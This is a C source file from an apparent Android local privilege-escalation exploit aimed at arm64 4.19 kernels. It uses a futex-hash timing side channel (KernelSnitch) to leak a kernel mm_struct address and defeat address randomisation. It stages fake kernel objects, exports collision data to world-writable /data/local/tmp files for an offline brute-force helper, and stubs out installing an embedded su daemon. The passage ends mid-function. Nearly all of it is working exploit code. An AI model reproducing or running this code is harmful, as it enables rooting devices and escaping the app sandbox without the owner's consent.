#define KS_SKIP_MAIN_UTILS 1
#include "common.h"
#include "kernelsnitch/kernelsnitch.h"
#include "bucket_answer.h"
#include "closed_loop.h"

static struct kernelsnitch_shared_state *ks;
static size_t mm_objs_per_slab;
static unsigned char *skb_buf;
static int reclaim_sv[2] = {-1, -1};
static struct mm_ctx prepare_ctx;
static struct mm_ctx spray_ctx;
static struct mm_ctx pre_ctx;
static struct mm_ctx post_ctx;
static pid_t child_leak;
static int slab_base_candidate;
static int kernel_page_collision_fail_fast;
int ks_leak_walk_touched;

uintptr_t page_base;
uintptr_t fake_lock;
uintptr_t fake_w0;
uintptr_t fake_task;
uintptr_t fake_parent;
uintptr_t fake_right;
uintptr_t fake_left;
uintptr_t fake_fops;
uintptr_t binwrite_target;
char ashmem_path[256] = "/dev/ashmem";

uintptr_t g_direct_map_end = DIRECT_MAP_END;
uintptr_t g_direct_map_base = DIRECT_MAP_BASE;
uintptr_t g_linear_map_delta = 0;
uintptr_t g_leak_target = 0;
static size_t g_ram_bytes;

static char ks_cache_path[512];
static struct closed_loop_collector_state g_closed_loop_collector;

static int read_boot_id(char *buf, size_t len) {
  FILE *f = fopen("/proc/sys/kernel/random/boot_id", "r");
  if (!f) return 0;
  if (!fgets(buf, len, f)) {
    fclose(f);
    return 0;
  }
  fclose(f);
  buf[strcspn(buf, "\r\n")] = 0;
  return strlen(buf) >= 8;
}

static int cache_path_usable(const char *path, int write) {
  char parent[512];
  char *slash;
  size_t n;
  if (!path || !*path || strlen(path) >= sizeof(parent)) return 0;
  if (access(path, F_OK) == 0)
    return access(path, write ? W_OK : R_OK) == 0;
  n = strlen(path);
  memcpy(parent, path, n + 1);
  slash = strrchr(parent, '/');
  if (!slash) return 0;
  if (slash == parent) parent[1] = 0;
  else *slash = 0;
  return access(parent, write ? W_OK : R_OK) == 0;
}

static const char *select_ks_cache_path(int write) {
  const char *env;
  const char *dir;
  char candidate[512];

  env = getenv("KS_CACHE_PATH");
  if (env && *env && cache_path_usable(env, write)) {
    snprintf(ks_cache_path, sizeof(ks_cache_path), "%s", env);
    return ks_cache_path;
  }

  dir = getenv("GHOSTLOCK_HOME");
  if (dir && *dir) {
    snprintf(candidate, sizeof(candidate), "%s/ks_cache.txt", dir);
    if (cache_path_usable(candidate, write)) {
      snprintf(ks_cache_path, sizeof(ks_cache_path), "%s", candidate);
      return ks_cache_path;
    }
  }
  dir = getenv("TMPDIR");
  if (dir && *dir) {
    snprintf(candidate, sizeof(candidate), "%s/ks_cache.txt", dir);
    if (cache_path_usable(candidate, write)) {
      snprintf(ks_cache_path, sizeof(ks_cache_path), "%s", candidate);
      return ks_cache_path;
    }
  }
  dir = getenv("HOME");
  if (dir && *dir) {
    snprintf(candidate, sizeof(candidate), "%s/ks_cache.txt", dir);
    if (cache_path_usable(candidate, write)) {
      snprintf(ks_cache_path, sizeof(ks_cache_path), "%s", candidate);
      return ks_cache_path;
    }
  }
  if (cache_path_usable("/sdcard/Download/ghostlock_ks_cache.txt", write)) {
    snprintf(ks_cache_path, sizeof(ks_cache_path), "%s",
             "/sdcard/Download/ghostlock_ks_cache.txt");
    return ks_cache_path;
  }
  if (cache_path_usable("/data/local/tmp/ks_cache.txt", write)) {
    snprintf(ks_cache_path, sizeof(ks_cache_path), "%s",
             "/data/local/tmp/ks_cache.txt");
    return ks_cache_path;
  }
  return NULL;
}

static size_t ks_cache_radius_bytes(void) {
  const char *env = getenv("KS_CACHE_RADIUS_GB");
  unsigned long long gb = env ? strtoull(env, NULL, 0) : 8;
  if (!gb) gb = 8;
  if (gb > 128) gb = 128;
  return (size_t)gb << 30;
}

__attribute__((unused))
static int ks_cache_load(uintptr_t *anchor, char *boot_id, size_t boot_len) {
  (void)anchor;
  (void)boot_id;
  (void)boot_len;
  pr_info("KS_CACHE disabled reason=run20-no-historical-mm\n");
  return 0;
}

__attribute__((unused))
static void ks_cache_save(uintptr_t anchor) {
  (void)anchor;
  pr_info("KS_CACHE save disabled reason=run20-no-historical-mm\n");
}

__attribute__((unused))
static int linear_delta_index(void) {
  const char *env = getenv("GHOSTLOCK_DELTA_INDEX");
  if (env && *env) {
    return atoi(env);
  }

  /* PC keeps this file world-writable and updates it between candidate
   * runs; an app cannot create files in /data/local/tmp, so it only reads
   * an already-created file and defaults to index 0. */
  FILE *f = fopen("/data/local/tmp/ks_delta_index.txt", "r");
  if (!f) {
    return 0;
  }
  char line[32] = "";
  if (!fgets(line, sizeof(line), f)) {
    fclose(f);
    return 0;
  }
  fclose(f);
  return atoi(line);
}

/* The kernel computes VA(phys) = PAGE_OFFSET + phys - memstart_addr.  For a
 * leaked mm at mm_va, every 1GB-aligned memstart that maps mm_va back into
 * alioth's RAM gives exactly one linear-map delta.  CFI step=4 is the
 * on-device oracle for which candidate is real. */
void select_linear_map_delta(uintptr_t mm_va) {
  /* Offline source verification (memory.h:185,280): 4.19 arm64 still uses
   * PHYS_OFFSET == memstart_addr, and memstart_addr can be randomized.
   * Until we can read memstart_addr, allow KS_LINEAR_DELTA to override the
   * 0 default for targeted validation instead of silently dropping it. */
  const char *delta_env = getenv("KS_LINEAR_DELTA");
  if (delta_env && *delta_env) {
    g_linear_map_delta = (uintptr_t)strtoll(delta_env, NULL, 0);
    pr_info("KS_DELTA override delta=%016zx mm=%016zx\n",
            g_linear_map_delta, mm_va);
    return;
  }
  pr_info("KS_DELTA delta=0 default (mm offset=%016zx)\n",
          (size_t)(mm_va - P0_PAGE_OFFSET));
  g_linear_map_delta = 0;
}

static void set_ks_window(uintptr_t anchor, int hit) {
  size_t radius = ks_cache_radius_bytes();
  uintptr_t start = g_direct_map_base;
  uintptr_t end = g_direct_map_end;
  const char *scan_start = getenv("KS_MM_START");
  const char *scan_end = getenv("KS_MM_END");
  if (scan_start && *scan_start && scan_end && *scan_end) {
    uintptr_t env_start = (uintptr_t)strtoull(scan_start, NULL, 0);
    uintptr_t env_end = (uintptr_t)strtoull(scan_end, NULL, 0);
    if (env_start < env_end && env_start >= g_direct_map_base &&
        env_end <= g_direct_map_end) {
      ks->identity_start = env_start;
      ks->identity_end = env_end;
      pr_info("KS_MM_SCAN override start=%016zx end=%016zx\n", env_start, env_end);
      return;
    }
  }
  if (hit && anchor >= g_direct_map_base + radius)
    start = anchor - radius;
  if (hit && anchor <= g_direct_map_end - radius)
    end = anchor + radius;
  ks->identity_start = start;
  ks->identity_end = end;
  if (hit)
    pr_info("KS_CACHE hit path=%s anchor=%016zx start=%016zx end=%016zx radius=%zuGB\n",
            ks_cache_path, anchor, start, end, radius >> 30);
}

/* read RAM size from /proc/meminfo so the physmap scan never walks (and never
 * reports) physical addresses that do not exist on this device */
static void detect_memory(void) {
  if (g_ram_bytes) {
    return;
  }
  size_t kb = 0;
  FILE *f = fopen("/proc/meminfo", "r");
  if (f) {
    char line[256];
    while (fgets(line, sizeof(line), f)) {
      unsigned long long v = 0;
      if (sscanf(line, "MemTotal: %llu kB", &v) == 1) {
        kb = (size_t)v;
        break;
      }
    }
    fclose(f);
  }
  if (!kb) {
    kb = 8ULL * 1024 * 1024;  /* conservative default 8 GB */
  }
  size_t bytes = kb * 1024;
  if (bytes < (1ULL << 30)) bytes = 1ULL << 30;
  if (bytes > (32ULL << 30)) bytes = 32ULL << 30;
  /* round up to 1 GB */
  bytes = (bytes + ((1ULL << 30) - 1)) & ~((1ULL << 30) - 1);
  g_ram_bytes = bytes;
  /* 4.19 arm64 uses the fixed PHYS_OFFSET/PAGE_OFFSET mapping.  The 256GB
   * region exists only as a compiler-time limit; real kernel objects live
   * in the physical RAM window. */
  g_direct_map_base = P0_PAGE_OFFSET;
  g_direct_map_end = P0_PAGE_OFFSET + g_ram_bytes;
  pr_info("memory detected ram=0x%zx (%zu GB) window_end=%016zx\n",
          g_ram_bytes, g_ram_bytes >> 30, (size_t)g_direct_map_end);
}

void setup_kernelsnitch(void) {
  int cpu_count = (int)sysconf(_SC_NPROCESSORS_ONLN);
  detect_memory();
  ks = kernelsnitch_setup(
      MM_STRUCT_SZ, MM_ORDER, cpu_count, KS_RUN16_COLLISIONS, 1, 0);  /* verbose diagnostics for on-device debug */
  ks->identity_start = (size_t)g_direct_map_base;
  ks->identity_end = (size_t)g_direct_map_end;
  pr_info("KS_MM_SCAN window start=%016zx end=%016zx\n",
          (size_t)ks->identity_start, (size_t)ks->identity_end);
  const char *scan_start = getenv("KS_MM_START");
  const char *scan_end = getenv("KS_MM_END");
  if (scan_start && *scan_start && scan_end && *scan_end) {
    uintptr_t start = (uintptr_t)strtoull(scan_start, NULL, 0);
    uintptr_t end = (uintptr_t)strtoull(scan_end, NULL, 0);
    if (start < end && start >= g_direct_map_base && end <= g_direct_map_end) {
      ks->identity_start = start;
      ks->identity_end = end;
      pr_info("KS_MM_SCAN override start=%016zx end=%016zx\n", start, end);
    }
  }
  const char *delta_str = getenv("KS_LINEAR_DELTA");
  if (delta_str && *delta_str) {
    g_linear_map_delta = strtoull(delta_str, NULL, 0);
    pr_info("linear_map delta override=0x%016zx\n", g_linear_map_delta);
  }
  ks->ram_bytes = g_ram_bytes;
}

int kernelsnitch_collisions_ready(void) {
  return kernelsnitch_found_collisions(ks);
}

/* candidate SLUB object sizes for the mm_struct cache (ALIGN to cacheline).
 * 0x340 was verified on-device (K40/SD870-class 4.19). */
static const size_t ksnitch_mm_sizes[] = {
  0x340, 0x380, 0x358, 0x400, 0x360, 0x300, 0x3c0, 0x480,
};
/* The vendor kernel randomizes the linear map (RANDOMIZE_BASE backport), so
 * A 7/7 futex-hash agreement is self-validating; only check that the
 * candidate lies inside the 4.19 256GB linear region. */
static int mm_plausible(size_t mm) {
  if (mm < g_direct_map_base || mm >= (size_t)g_direct_map_end) {
    return 0;
  }
  /* 4.19 arm64 uses a fixed PAGE_OFFSET/PHYS_OFFSET mapping.  A leaked
   * mm whose linear offset exceeds physical RAM cannot be real and must
   * not be fed into the exploit page, where it would create wild PI
   * nodes. */
  if ((mm - P0_PAGE_OFFSET) >= g_ram_bytes) {
    return 0;
  }
  return 1;
}

int bucket_answer_mm_plausible(uintptr_t mm) {
  if (!g_ram_bytes) {
    detect_memory();
  }
  return mm_plausible(mm);
}

/* Export the collision futex addresses so a PC worker can search the whole
 * 256GB linear map in parallel; the device then only polls for the answer. */
static void ks_export_collisions(const char *boot_id) {
  char path[256];
  FILE *f;
  const char *timings_path;
  FILE *tf;
  snprintf(path, sizeof(path), "/data/local/tmp/ks_collisions.txt");
  /* Untrusted-app context cannot create files in /data/local/tmp, so the
   * helper pre-creates a world-writable file; write in place (no tmp+rename). */
  f = fopen(path, "w");
  if (!f) {
    pr_warning("KS_PC export failed path=%s\n", path);
    return;
  }
  fprintf(f, "boot_id=%s\n", boot_id);
  fprintf(f, "futex_hashsize=0x%lx\n", (unsigned long)futex_hashsize);
  fprintf(f, "initval_mode=raw-private\n");
  fprintf(f, "configured_collisions=%zu\n", ks->collisions);
  fprintf(f, "accepted_collisions=%zu\n",
          ks->accepted_count > 2 ? (size_t)ks->accepted_count - 2 : 0);
  fprintf(f, "voting_rounds=%zu\n", (size_t)KS_RUN16_VOTING_ROUNDS);
  fprintf(f, "same_page_offsets=%zu\n", (size_t)KS_V4_SAME_PAGE_OFFSETS);
  fprintf(f, "v5_page_count=%zu\n", (size_t)ks->v5_page_count);
  fprintf(f, "v5_selected_page=0x%016zx\n", (size_t)ks->v5_selected_page);
  fprintf(f, "v5_selected_candidates=%zu\n",
          (size_t)ks->v5_selected_candidates);
  fprintf(f, "v9_disc_count=%zu\n", (size_t)ks->v9_disc_count);
  fprintf(f, "v9_strict_count=%zu\n", (size_t)ks->v9_strict_count);
  fprintf(f, "rounds_completed=%zu\n", (size_t)ks->rounds_completed);
  fprintf(f, "target_addr=0x%016zx\n", (size_t)ks->target_addr);
  fprintf(f, "anchor_addr=0x%016zx\n", (size_t)ks->anchor_addr);
  fprintf(f, "validation_target_checked=%zu\n",
          (size_t)ks->validation_target_checked);
  fprintf(f, "validation_target_passed=%zu\n",
          (size_t)ks->validation_target_passed);
  fprintf(f, "validation_candidate_checked=%zu\n",
          (size_t)ks->validation_candidate_checked);
  fprintf(f, "validation_candidate_passed=%zu\n",
          (size_t)ks->validation_candidate_passed);
  fprintf(f, "validation_candidate_candidate_checked=%zu\n",
          (size_t)ks->validation_candidate_candidate_checked);
  fprintf(f, "validation_candidate_candidate_passed=%zu\n",
          (size_t)ks->validation_candidate_candidate_passed);
  fprintf(f, "candidate_count=%zu\n",
          (size_t)ks->candidate1_count);
  fprintf(f, "stable_candidate_count=%zu\n",
          (size_t)ks->stable_candidate_count);
  for (size_t i = 2; i < ks->accepted_count; ++i) {
    size_t candidate = (size_t)ks->accepted_idx[i];
    size_t candidate_index = (size_t)-1;
    for (size_t a = 0; a < ks->candidate1_count; ++a) {
      if ((size_t)ks->candidate1_idx[a] == candidate) {
        candidate_index = a;
        break;
      }
    }
    if (candidate_index == (size_t)-1)
      continue;
    fprintf(f,
            "collision_addr=0x%016zx votes=t2c=%zu/%zu,c2t=%zu/%zu,c2c=%zu/%zu "
            "r0_t2c_before=%zu r0_t2c_after=%zu r0_c2t_before=%zu r0_c2t_after=%zu "
            "r0_c2c_before=%zu r0_c2c_after=%zu "
            "r1_t2c_before=%zu r1_t2c_after=%zu r1_c2t_before=%zu r1_c2t_after=%zu "
            "r1_c2c_before=%zu r1_c2c_after=%zu "
            "r2_t2c_before=%zu r2_t2c_after=%zu r2_c2t_before=%zu r2_c2t_after=%zu "
            "r2_c2c_before=%zu r2_c2c_after=%zu\n",
            (size_t)ks->futex_addrs[i],
            (size_t)ks->candidate_t2c_votes[candidate_index],
            (size_t)KS_RUN16_VOTING_ROUNDS,
            (size_t)ks->candidate_c2t_votes[candidate_index],
            (size_t)KS_RUN16_VOTING_ROUNDS,
            (size_t)ks->candidate_c2c_votes[candidate_index],
            (size_t)KS_RUN16_VOTING_ROUNDS,
            (size_t)ks->candidate_t2c_before[candidate_index * KS_RUN16_VOTING_ROUNDS + 0],
            (size_t)ks->candidate_t2c_after[candidate_index * KS_RUN16_VOTING_ROUNDS + 0],
            (size_t)ks->candidate_c2t_before[candidate_index * KS_RUN16_VOTING_ROUNDS + 0],
            (size_t)ks->candidate_c2t_after[candidate_index * KS_RUN16_VOTING_ROUNDS + 0],
            (size_t)ks->candidate_c2c_before[candidate_index * KS_RUN16_VOTING_ROUNDS + 0],
            (size_t)ks->candidate_c2c_after[candidate_index * KS_RUN16_VOTING_ROUNDS + 0],
            (size_t)ks->candidate_t2c_before[candidate_index * KS_RUN16_VOTING_ROUNDS + 1],
            (size_t)ks->candidate_t2c_after[candidate_index * KS_RUN16_VOTING_ROUNDS + 1],
            (size_t)ks->candidate_c2t_before[candidate_index * KS_RUN16_VOTING_ROUNDS + 1],
            (size_t)ks->candidate_c2t_after[candidate_index * KS_RUN16_VOTING_ROUNDS + 1],
            (size_t)ks->candidate_c2c_before[candidate_index * KS_RUN16_VOTING_ROUNDS + 1],
            (size_t)ks->candidate_c2c_after[candidate_index * KS_RUN16_VOTING_ROUNDS + 1],
            (size_t)ks->candidate_t2c_before[candidate_index * KS_RUN16_VOTING_ROUNDS + 2],
            (size_t)ks->candidate_t2c_after[candidate_index * KS_RUN16_VOTING_ROUNDS + 2],
            (size_t)ks->candidate_c2t_before[candidate_index * KS_RUN16_VOTING_ROUNDS + 2],
            (size_t)ks->candidate_c2t_after[candidate_index * KS_RUN16_VOTING_ROUNDS + 2],
            (size_t)ks->candidate_c2c_before[candidate_index * KS_RUN16_VOTING_ROUNDS + 2],
            (size_t)ks->candidate_c2c_after[candidate_index * KS_RUN16_VOTING_ROUNDS + 2]);
  }
  if (!ks->v9_disc_count) {
    for (size_t i = 0; i < ks->candidate1_count; ++i) {
      size_t idx = (size_t)ks->candidate1_idx[i];
      fprintf(f,
              "candidate_addr=0x%016zx page=0x%016zx offset=0x%03zx "
              "pile=initial accepted=0 "
              "t_before=%zu t_after=%zu\n",
              (size_t)&ks->futexes[idx], (size_t)idx & ~0xffful,
              (size_t)idx & 0xfff, (size_t)ks->candidate_initial_before[i],
              (size_t)ks->candidate_initial_after[i]);
    }
    for (size_t i = 0; i < ks->candidate2_count; ++i) {
      size_t idx = (size_t)ks->candidate2_idx[i];
      size_t slot = idx / KS_PAGE_SIZE;
      fprintf(f,
              "candidate_addr=0x%016zx pile=2 round=2 round_votes=1 "
              "stable=0 t_before=%zu t_after=%zu\n",
              (size_t)&ks->futexes[idx], (size_t)ks->t_before2[slot],
              (size_t)ks->times2[slot]);
    }
    for (size_t i = 0; i < ks->candidate3_count; ++i) {
      size_t idx = (size_t)ks->candidate3_idx[i];
      size_t slot = idx / KS_PAGE_SIZE;
      fprintf(f,
              "candidate_addr=0x%016zx pile=2 round=3 round_votes=1 "
              "stable=0 t_before=%zu t_after=%zu\n",
              (size_t)&ks->futexes[idx], (size_t)ks->t_before2[slot],
              (size_t)ks->times3[slot]);
    }
    for (size_t i = 0; i < ks->stable_candidate_count; ++i) {
      size_t idx = (size_t)ks->stable_candidate_idx[i];
      size_t slot = idx / KS_PAGE_SIZE;
      fprintf(f,
              "stable_candidate_addr=0x%016zx round_votes=7 "
              "t_before=%zu t_after=%zu\n",
              (size_t)&ks->futexes[idx], (size_t)ks->t_before[slot],
              (size_t)ks->times[slot]);
    }
  }
  fclose(f);
  pr_info("KS_PC export path=%s accepted=%zu candidates=%zu stable=%zu "
          "rounds=%zu hashsize=0x%lx\n",
          path, (size_t)ks->accepted_count,
          (size_t)ks->candidate1_count + (size_t)ks->candidate2_count +
          (size_t)ks->candidate3_count,
          (size_t)ks->stable_candidate_count,
          (size_t)ks->rounds_completed, (unsigned long)futex_hashsize);

  timings_path = getenv("KS_TIMINGS");
  if (timings_path && *timings_path && !ks->v9_disc_count) {
    tf = fopen(timings_path, "w");
    if (tf) {
      fprintf(tf, "boot_id=%s\n", boot_id);
      fprintf(tf, "futex_hashsize=0x%lx\n", (unsigned long)futex_hashsize);
      fprintf(tf, "total=%zu\n", ks->total_futexes);
      for (size_t i = 2; i < ks->total_futexes; ++i) {
        fprintf(tf, "%zu 0x%016zx %zu %zu\n", i,
                (size_t)&ks->futexes[(i * KS_PAGE_SIZE) | (i * 8 % KS_PAGE_SIZE)],
                (size_t)ks->t_before[i], (size_t)ks->times[i]);
      }
      fclose(tf);
      pr_info("KS_TIMINGS export path=%s rows=%zu\n", timings_path,
              ks->total_futexes - 2);
    } else {
      pr_warning("KS_TIMINGS export failed path=%s\n", timings_path);
    }
  }
}

/* Read a PC-provided mm answer; only accept 64B-aligned alioth linear-map
 * VAs so a stale/corrupt file can't poison the exploit. */
__attribute__((unused))
static int ks_pc_answer_read(uintptr_t *out) {
  (void)out;
  pr_info("KS_PC answer disabled reason=run20-no-historical-mm\n");
  return 0;
}

/* Wait up to KS_PC_WAIT seconds for the PC worker to drop its answer. */
static int ks_pc_wait_answer(uintptr_t *out) {
  const char *env = getenv("KS_PC_WAIT");
  const char *poll_env = getenv("KS_PC_POLL_MS");
  int wait_s = env ? atoi(env) : 60;
  int poll_ms = poll_env ? atoi(poll_env) : 1000;
  if (poll_ms < 250) poll_ms = 250;
  if (poll_ms > 2000) poll_ms = 2000;
  if (wait_s <= 0) return 0;
  pr_info("KS_PC waiting up to %ds poll_ms=%d for %s\n", wait_s, poll_ms,
          "/data/local/tmp/ks_mm_answer.txt");
  int elapsed_ms = 0;
  while (elapsed_ms < wait_s * 1000) {
    if (ks_pc_answer_read(out)) {
      return 1;
    }
    usleep(poll_ms * 1000);
    elapsed_ms += poll_ms;
  }
  return ks_pc_answer_read(out);
}

/* Called from every scan thread at coarse-block boundaries so a PC answer
 * can short-circuit a local 256GB scan in progress. */
int ks_pc_abort_check(uintptr_t *out) {
  (void)out;
  return 0;
}

void run_kernelsnitch_bruteforce(void) {
  char boot_id[128];
  boot_id[0] = '\0';
  pr_info("KS_MM_REUSE disabled reason=run20-fresh-scan-only\n");
  if (kernelsnitch_collisions_ready()) {
    ks_export_collisions(boot_id);
    const char *collect_only = getenv("KS_MM_COLLECT_ONLY");
    if (collect_only && strcmp(collect_only, "1") == 0) {
      pr_info("S3-COLLECT header mode=one-shot collisions=%zu "
              "candidates=%zu stable=%zu exported=1\n",
              (size_t)ks->accepted_count, (size_t)ks->candidate_count,
              (size_t)ks->stable_candidate_count);
      pr_info("S3-COLLECT verdict=PASS\n");
      exit(0);
    }
    /* Run20 is fresh-scan only: no cache hit, no answer-file short circuit,
     * and no reuse of an mm discovered in a previous boot or run. */
  }
  set_ks_window(0, 0);
  kernelsnitch_bruteforce(ks);
  if (ks->mm_struct != (size_t)-1 && mm_plausible(ks->mm_struct)) {
    pr_info("KernelSnitch mm found addr=%016zx sz=0x%zx\n",
            ks->mm_struct, ks->mm_struct_sz);
    return;
  }
  for (size_t i = 0; i < sizeof(ksnitch_mm_sizes) / sizeof(ksnitch_mm_sizes[0]); ++i) {
    size_t size = ksnitch_mm_sizes[i];
    if (size == ks->mm_struct_sz) continue;
    ks->mm_struct_sz = size;
    ks->mm_struct = (size_t)-1;
    ks->state = KERNELSNITCH_COLLISIONS_FOUND;
    pr_info("KS_MM_SIZE_TRY size=%016zx\n", size);
    kernelsnitch_bruteforce(ks);
    if (ks->mm_struct != (size_t)-1 && mm_plausible(ks->mm_struct)) {
      pr_info("KernelSnitch mm found addr=%016zx sz=0x%zx\n",
              ks->mm_struct, ks->mm_struct_sz);
      return;
    }
  }
  if (ks->mm_struct == (size_t)-1 || !mm_plausible(ks->mm_struct)) {
    pr_warning("KernelSnitch mm_struct scan failed\n");
  }
  pr_warning("KernelSnitch mm_struct leak failed (no size/order sweep)\n");
}

/* Buddy-allocated order-3 slabs are aligned to 2^3 pages, so the mm's
 * containing slab starts at the leaked address truncated to 32KB. */
static uintptr_t select_slab_base(uintptr_t leaked, int candidate) {
  (void)candidate;
  const char *override = getenv("KSLAB_BASE");
  if (override && *override) {
    uintptr_t base = strtoull(override, NULL, 16);
    if (base && base <= leaked &&
        leaked - base < ORDER3_SIZE) {
      return base;
    }
  }
  return leaked & ~((uintptr_t)ORDER3_SIZE - 1);
}

uintptr_t current_kernelsnitch_mm_struct(void) {
  return ks->mm_struct;
}

uintptr_t cleanup_kernelsnitch(void) {
  uintptr_t leaked = kernelsnitch_cleanup(ks);
  ks = NULL;
  return leaked;
}

int closed_loop_path_is_private(const char *path) {
  return path && *path &&
         strncmp(path, "/data/local/tmp/", 16) != 0 &&
         strncmp(path, "/data/data/org.mozilla.firefox/files/", 38) == 0;
}

static int closed_loop_private_path(const char *path) {
  return closed_loop_path_is_private(path);
}

static int closed_loop_sync_dir(const char *path) {
  char dir[512];
  char *slash;
  int fd;

  snprintf(dir, sizeof(dir), "%s", path);
  slash = strrchr(dir, '/');
  if (!slash || slash == dir) {
    return -1;
  }
  *slash = '\0';
  fd = open(dir, O_RDONLY | O_DIRECTORY | O_CLOEXEC);
  if (fd < 0) {
    return -1;
  }
  if (fsync(fd) != 0) {
    close(fd);
    return -1;
  }
  close(fd);
  return 0;
}

static void closed_loop_capture_evidence(
    const struct kernelsnitch_shared_state *ks,
    const char *boot_id) {
  size_t edge_count = 0;

  memset(&g_closed_loop_collector, 0, sizeof(g_closed_loop_collector));
  snprintf(g_closed_loop_collector.boot_id,
           sizeof(g_closed_loop_collector.boot_id), "%s", boot_id);
  g_closed_loop_collector.rounds = (size_t)KS_RUN16_VOTING_ROUNDS;
  for (size_t i = 2; i < ks->accepted_count &&
                     edge_count < CLOSED_LOOP_MAX_EDGES; ++i) {
    size_t candidate_index = (size_t)-1;
    struct closed_loop_edge_evidence *edge =
        &g_closed_loop_collector.edges[edge_count];

    for (size_t a = 0; a < ks->candidate1_count; ++a) {
      if ((size_t)ks->candidate1_idx[a] == (size_t)ks->accepted_idx[i]) {
        candidate_index = (size_t)a;
        break;
      }
    }
    if (candidate_index == (size_t)-1 ||
        candidate_index >= ks->candidate_max) {
      continue;
    }
    edge->target_addr = (uintptr_t)ks->futex_addrs[0];
    edge->candidate_addr = (uintptr_t)ks->futex_addrs[i];
    edge->t2c_votes = (size_t)ks->candidate_t2c_votes[candidate_index];
    edge->c2t_votes = (size_t)ks->candidate_c2t_votes[candidate_index];
    edge->c2c_votes = (size_t)ks->candidate_c2c_votes[candidate_index];
    edge->rounds = (size_t)KS_RUN16_VOTING_ROUNDS;
    ++edge_count;
  }
  g_closed_loop_collector.same_edges = edge_count;
  g_closed_loop_collector.pass = edge_count > 0 &&
      (size_t)ks->accepted_count == edge_count + 2 &&
      ks->futex_hash_table_size == 0x800;
  for (size_t i = 0; i < edge_count; ++i) {
    const struct closed_loop_edge_evidence *edge =
        &g_closed_loop_collector.edges[i];
    if (edge->t2c_votes != edge->rounds ||
        edge->c2t_votes != edge->rounds ||
        edge->c2c_votes != edge->rounds) {
      g_closed_loop_collector.pass = 0;
    }
  }
}

static int closed_loop_write_bucket(const char *path,
                                    const char *boot_id) {
  const struct kernelsnitch_shared_state *ks_ptr = ks;
  size_t candidate_count = g_closed_loop_collector.same_edges;
  char tmp_path[768];
  FILE *f;

  if (!ks_ptr || !closed_loop_private_path(path) ||
      strlen(path) + 4 >= sizeof(tmp_path)) {
    return -1;
  }
  snprintf(tmp_path, sizeof(tmp_path), "%s.tmp", path);
  f = fopen(tmp_path, "wb");
  if (!f) {
    return -1;
  }
  fprintf(f, "BUCKET_COLLECT_V1\n");
  fprintf(f, "boot_id=%s\n", boot_id);
  fprintf(f, "model=raw-private\n");
  fprintf(f, "futex_hashsize=0x%lx\n", (unsigned long)futex_hashsize);
  fprintf(f, "probe_count=%zu\n", candidate_count + 1);
  fprintf(f, "same_edges=%zu\n", candidate_count);
  fprintf(f, "unknown_edges=0\n");
  fprintf(f, "diff_edges=0\n");
  fprintf(f, "probe id=%03zu addr=0x%016zx page=0x%016zx class=c000\n",
          (size_t)0, (size_t)ks_ptr->futex_addrs[0],
          (size_t)(ks_ptr->futex_addrs[0] & ~0xfffULL));
  for (size_t i = 0; i < candidate_count; ++i) {
    const struct closed_loop_edge_evidence *edge =
        &g_closed_loop_collector.edges[i];
    fprintf(f,
            "probe id=%03zu addr=0x%016zx page=0x%016zx class=c%03zu\n",
            i + 1, (size_t)edge->candidate_addr,
            (size_t)(edge->candidate_addr & ~0xfffULL), i + 1);
  }
  for (size_t i = 0; i < candidate_count; ++i) {
    const struct closed_loop_edge_evidence *edge =
        &g_closed_loop_collector.edges[i];
    fprintf(f,
            "pair a=000 b=%03zu verdict=SAME t2c=%zu/%zu c2t=%zu/%zu "
            "c2c=%zu/%zu\n",
            i + 1, edge->t2c_votes, edge->rounds,
            edge->c2t_votes, edge->rounds,
            edge->c2c_votes, edge->rounds);
  }
  fprintf(f, "collector_verdict=%s\n",
          g_closed_loop_collector.pass ? "PASS" : "FAIL");
  if (fflush(f) != 0 || fsync(fileno(f)) != 0) {
    fclose(f);
    unlink(tmp_path);
    return -1;
  }
  fclose(f);
  if (rename(tmp_path, path) != 0 || closed_loop_sync_dir(path) != 0) {
    unlink(tmp_path);
    return -1;
  }
  return 0;
}

int closed_loop_collect_bucket(void) {
  const char *mode = getenv("KS_MMLOOP_MODE");
  const char *bucket_path = getenv("KS_BUCKET_FILE");
  char boot_id[128];
  uint8_t digest[32];
  char bucket_hex[65];

  if (!mode || strcmp(mode, "closed-loop") != 0 ||
      getenv("KS_MM_TEST")) {
    return 1;
  }
  if (ks) {
    return 1;
  }
  if (!bucket_path || !closed_loop_private_path(bucket_path) ||
      !read_boot_id(boot_id, sizeof(boot_id))) {
    return 1;
  }
  setup_kernelsnitch();
  kernelsnitch_find_collisions(ks);
  if (!kernelsnitch_collisions_ready()) {
    if (ks) {
      ks->state = KERNELSNITCH_MM_NOT_FOUND;
      (void)kernelsnitch_cleanup(ks);
      ks = NULL;
    }
    return 1;
  }
  closed_loop_capture_evidence(ks, boot_id);
  if (!g_closed_loop_collector.pass ||
      closed_loop_write_bucket(bucket_path, boot_id) != 0 ||
      bucket_answer_sha256_file(bucket_path, digest) != 0) {
    if (ks) {
      ks->state = KERNELSNITCH_MM_NOT_FOUND;
      (void)kernelsnitch_cleanup(ks);
      ks = NULL;
    }
    return 1;
  }
  {
    static const char digits[] = "0123456789abcdef";
    for (size_t i = 0; i < 32; ++i) {
      bucket_hex[i * 2] = digits[digest[i] >> 4];
      bucket_hex[i * 2 + 1] = digits[digest[i] & 15];
    }
    bucket_hex[64] = '\0';
  }
  snprintf(g_closed_loop_collector.bucket_sha256,
           sizeof(g_closed_loop_collector.bucket_sha256), "%s", bucket_hex);
  ks->state = KERNELSNITCH_MM_NOT_FOUND;
  (void)kernelsnitch_cleanup(ks);
  ks = NULL;
  return 0;
}

const struct closed_loop_collector_state *closed_loop_collector_state(void) {
  return &g_closed_loop_collector;
}

__attribute__((weak))
int install_embedded_su(pid_t *daemon_pid) {
  if (daemon_pid) {
    *daemon_pid = -1;
  }
  errno = ENOSYS;
  return 0;
}

__attribute__((weak))
int install_embedded_wallpaper(void) {
  errno = ENOSYS;
  return 0;
}

void read_first_line(const char *path, char *buf, size_t len) {
  if (!len) {
    return;
  }
  snprintf(buf, len, "unreadable");
  int fd = open(path, O_RDONLY | O_CLOEXEC);
  if (fd < 0) {
    return;
  }
  ssize_t n = read(fd, buf, len - 1);
  int saved_errno = errno;
  close(fd);
  if (n <= 0) {
    errno = saved_errno;
    snprintf(buf, len, "unreadable");
    return;
  }
  buf[n] = 0;
  buf[strcspn(buf, "\r\n")] = 0;
}

void log_startup_context(void) {
  char attr[256];
  char enforce[32];
  char status[4096];
  char limits[160] = "NoNewPrivs=? Seccomp=? Seccomp_filters=?";
  read_first_line("/proc/self/attr/current", attr, sizeof(attr));
